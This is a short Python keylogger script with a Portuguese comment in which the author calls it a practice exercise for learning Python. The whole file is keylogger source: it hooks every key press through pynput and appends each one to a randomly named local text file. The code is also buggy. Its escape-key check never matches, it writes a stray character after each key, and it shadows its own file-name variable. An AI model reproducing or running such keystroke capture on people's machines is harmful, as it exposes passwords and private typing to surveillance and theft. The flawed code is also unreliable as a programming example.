# Keylogger feito por mim (ymg) | Fiz para desenvolver habilidades no python, sou intermediário ainda.
from pynput.keyboard import Listener
import sys
import random
import secrets

numero_log = random.randint(0,1000)
log = f'ny{numero_log}.txt'

def escreve_key(key):
    with open(f'{log}', 'a') as file:
         file.write(f'{str(key)}\n s')
    if key == 'Key.esc':
         sys.exit()
with Listener(on_press=escreve_key) as log:
     log.join()